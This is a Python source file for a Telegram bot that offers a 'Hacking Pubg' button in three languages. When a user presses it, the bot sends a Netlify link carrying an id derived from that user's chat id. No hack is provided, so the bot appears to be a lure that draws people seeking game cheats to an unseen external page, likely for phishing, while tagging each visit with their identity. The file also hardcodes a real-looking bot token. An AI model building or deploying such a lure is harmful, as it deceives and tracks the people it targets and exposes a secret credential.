import telebot
from telebot import types

TOKEN = '8221542511:AAEvE5MjrcwT1vaicaKQ9ON03T8mMqKfw6M'
bot = telebot.TeleBot(TOKEN)

# Main Menu Generator
def get_main_menu(lang='en'):
    markup = types.InlineKeyboardMarkup()
    if lang == 'ar':
        markup.add(types.InlineKeyboardButton("🚀 Hacking Pubg", callback_data="hack_pubg"))
        markup.add(types.InlineKeyboardButton("👨‍💻 Contact Developer", url="https://t.me/VIPQR9"))
    elif lang == 'ru':
        markup.add(types.InlineKeyboardButton("🚀 Hacking Pubg", callback_data="hack_pubg"))
        markup.add(types.InlineKeyboardButton("👨‍💻 Contact Developer", url="https://t.me/VIPQR9"))
    else: # English default
        markup.add(types.InlineKeyboardButton("🚀 Hacking Pubg", callback_data="hack_pubg"))
        markup.add(types.InlineKeyboardButton("👨‍💻 Contact Developer", url="https://t.me/VIPQR9"))
    return markup

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.chat.id
    msg = "Please select your language:"
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("العربية 🇸🇦", callback_data="lang_ar"))
    markup.add(types.InlineKeyboardButton("English 🇺🇸", callback_data="lang_en"))
    markup.add(types.InlineKeyboardButton("Русский 🇷🇺", callback_data="lang_ru"))
    bot.send_message(user_id, msg, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    user_id = call.message.chat.id
    # Unique referral link generation for the user
    unique_id = user_id * 12345
    ref_link = f"https://meek-kitten-3e9f10.netlify.app?id={unique_id}"
    
    if call.data.startswith("lang_"):
        lang = call.data.split("_")[1]
        text = "Language selected! Menu:"
        bot.edit_message_text(text=text, chat_id=user_id, message_id=call.message.message_id, reply_markup=get_main_menu(lang))
    
    # Interaction for Hacking Pubg button
    elif call.data == "hack_pubg":
        bot.send_message(user_id, f"Click here to access: {ref_link}")

print("Bot is running...")
bot.polling()
